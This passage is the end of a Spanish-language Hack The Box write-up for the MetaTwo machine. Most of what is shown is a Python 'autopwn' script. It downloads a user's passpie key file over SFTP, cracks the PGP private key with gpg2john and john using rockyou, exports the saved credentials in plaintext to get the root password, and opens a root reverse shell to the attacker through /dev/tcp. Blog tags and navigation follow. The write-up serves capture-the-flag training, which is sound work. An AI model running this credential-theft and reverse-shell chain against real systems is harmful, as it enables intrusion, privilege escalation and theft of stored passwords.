			<span class="n">sftp_client</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"/home/jnelson/.passpie/.keys"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"./</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">passpie_keys_file</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

		<span class="n">ssh_client</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

	<span class="k">def</span> <span class="nf">ssh_connection</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ssh_user</span><span class="p">,</span> <span class="n">ssh_pass</span><span class="p">):</span>
		<span class="s">"""
		SSH connection like a user
		"""</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">ssh_client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">SSHClient</span><span class="p">()</span>
			<span class="n">ssh_client</span><span class="p">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="p">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span>
			<span class="n">ssh_client</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'ip_address'</span><span class="p">],</span> 
				<span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">,</span>
				<span class="n">username</span><span class="o">=</span><span class="n">ssh_user</span><span class="p">,</span> 
				<span class="n">password</span><span class="o">=</span><span class="n">ssh_pass</span><span class="p">)</span>

			<span class="k">return</span> <span class="n">ssh_client</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[X] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">extract_pgp_private_key</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">passpie_keys_file</span><span class="p">,</span> <span class="s">"rt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">keys_file</span><span class="p">:</span>
			<span class="n">keys_file_content</span> <span class="o">=</span> <span class="n">keys_file</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

		<span class="n">passpie_private_key_content</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"(?s)-----BEGIN .+?-----.+?-----END .+?-----</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">keys_file_content</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">passpie_private_key</span><span class="p">,</span> <span class="s">"wt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">key_file</span><span class="p">:</span>
			<span class="n">key_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">passpie_private_key_content</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">crack_gpg_key</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="c1"># create gpg hash with john
</span>			<span class="n">command</span> <span class="o">=</span> <span class="s">'gpg2john passpie_private_key &gt; passpie_private_key_hash'</span>
			<span class="n">crack_process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

			<span class="c1"># crack gpg hash
</span>			<span class="n">command</span> <span class="o">=</span> <span class="s">'john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt passpie_private_key_hash'</span>
			<span class="n">john_output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
			
			<span class="c1"># extract passpie password
</span>			<span class="k">if</span> <span class="s">"No password hashes left to crack (see FAQ)"</span> <span class="ow">in</span> <span class="n">john_output</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">decode</span><span class="p">():</span>
				<span class="c1"># if has been cracked before
</span>				<span class="n">john_output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"john --show passpie_private_key_hash"</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
				<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'passpie_pass'</span><span class="p">]</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"(Passpie:.*):::"</span><span class="p">,</span> <span class="n">john_output</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">decode</span><span class="p">())[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

				<span class="k">return</span>

			<span class="c1"># first time cracking
</span>			<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'passpie_pass'</span><span class="p">]</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"(.*?)\s+\(Passpie\)"</span><span class="p">,</span> <span class="n">john_output</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">decode</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[X] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">extract_root_pass</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ssh_client</span><span class="p">):</span>
		<span class="s">"""
		SSH connection like jnelson to export users credentials in plaintext
		"""</span>
		<span class="k">with</span> <span class="n">ssh_client</span> <span class="k">as</span> <span class="n">ssh_client</span><span class="p">:</span>
			<span class="c1"># create personal workstation
</span>			<span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="s">"mkdir -p /tmp/.{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="p">))</span>
			
			<span class="c1"># save credentials
</span>			<span class="n">_stdin</span><span class="p">,</span> <span class="n">_stdout</span><span class="p">,</span> <span class="n">_stderr</span> <span class="o">=</span> <span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="s">"passpie export /tmp/.{}/user_credentials"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="p">))</span>
			<span class="n">_stdin</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'passpie_pass'</span><span class="p">]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
			<span class="n">_stdin</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>

			<span class="c1"># wait until the file is created
</span>			<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
			
			<span class="c1"># open credentials file and extract root password
</span>			<span class="n">_stdin</span><span class="p">,</span> <span class="n">_stdout</span><span class="p">,</span> <span class="n">_stderr</span> <span class="o">=</span> <span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="s">"cat /tmp/.{}/user_credentials"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="p">))</span>
			
			<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'root_pass'</span><span class="p">]</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"password: .*? '(.*?)'\s"</span><span class="p">,</span> <span class="n">_stdout</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>

			<span class="c1"># remove personal workstation
</span>			<span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="s">"rm -r /tmp/.{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="p">))</span>

	<span class="k">def</span> <span class="nf">get_shell</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="s">"""
		Send reverse shell to local machine
		"""</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">ssh_client</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">ssh_connection</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_user'</span><span class="p">],</span> <span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_pass'</span><span class="p">])</span>

			<span class="n">reverse_shell</span> <span class="o">=</span> <span class="s">"su root -c 'bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1'"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
			<span class="n">_stdin</span><span class="p">,</span> <span class="n">_stdout</span><span class="p">,</span> <span class="n">_stderr</span> <span class="o">=</span> <span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="n">reverse_shell</span><span class="p">)</span>
			<span class="n">_stdin</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'root_pass'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
			<span class="n">_stdin</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>

			<span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>

			<span class="k">if</span> <span class="n">shell</span><span class="p">.</span><span class="n">sock</span><span class="p">:</span>
				<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Press Ctrl + D to exit.'</span><span class="p">)</span>
				<span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[X] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

<span class="c1">## Main flow
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">ascii_title</span> <span class="o">=</span> <span class="s">"""
	|\/|  _  _|_  _. _|_       _     /\      _|_  _  ._       ._  
	|  | (/_  |_ (_|  |_ \/\/ (_)   /--\ |_|  |_ (_) |_) \/\/ | |
	                                                 |
	                                                         by marss
	"""</span>

	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
		<span class="n">description</span><span class="o">=</span><span class="n">ascii_title</span><span class="p">,</span>
		<span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="p">.</span><span class="n">RawDescriptionHelpFormatter</span><span class="p">,</span>
		<span class="n">epilog</span><span class="o">=</span><span class="s">"""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		"""</span><span class="p">)</span>

	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span> <span class="s">'--ip'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Specified IP to receive the shell"</span><span class="p">)</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Specified PORT to receive the shell"</span><span class="p">)</span>

	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

	<span class="k">print</span><span class="p">(</span><span class="n">ascii_title</span><span class="p">)</span>

	<span class="n">exploit</span> <span class="o">=</span> <span class="n">Exploit</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>

	<span class="n">exploit</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-src="/assets/img/htb/writeups/metatwo/autopwn.png" alt="PoC" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Puedes encontrar el script y sus requerimientos en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_MetaTwo/autopwn">https://github.com/E1P0TR0</a></p></div></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/cve-2022-0739/" class="post-tag no-text-decoration" >CVE-2022-0739</a> <a href="/tags/cve-2021-29447/" class="post-tag no-text-decoration" >CVE-2021-29447</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLI</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >XXE</a> <a href="/tags/information-leakage/" class="post-tag no-text-decoration" >Information Leakage</a> <a href="/tags/passpie/" class="post-tag no-text-decoration" >Passpie</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Metatwo - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBMetaTwo/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Metatwo - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBMetaTwo/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBMetaTwo/&amp;text=Hackthebox Writeup Metatwo - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBOpensource/"><div class="card-body"> <em class="timeago small" data-ts="1656392833" > 2022-06-28 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Opensource</h3><div class="text-muted small"><p> Entorno Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) a...</p></div></div></a></div><div class="card"> <a href="/posts/HTBRedpanda/"><div class="card-body"> <em class="timeago small" data-ts="1663882934" > 2022-09-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Redpanda</h3><div class="text-muted small"><p> Overview Remote code excution by Server Site Template Injection (SSTI) (Foothold) Read files privileged by Xml External Entity Attack (XXE) (Privilege Escalation) OS ...</p></div></div></a></div><div class="card"> <a href="/posts/HTBShoppy/"><div class="card-body"> <em class="timeago small" data-ts="1664902695" > 2022-10-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Shoppy</h3><div class="text-muted small"><p> Overview Bypass login page by NoSQL Injection User credentials by User enumeration Leak of SSH credentials in Mattermost system (Foothold) SSH credentials leak by Reverse engineering to b...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBPhotobomb/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Photobomb</p></a> <a href="/posts/HTBAmbassador/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Ambassador</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
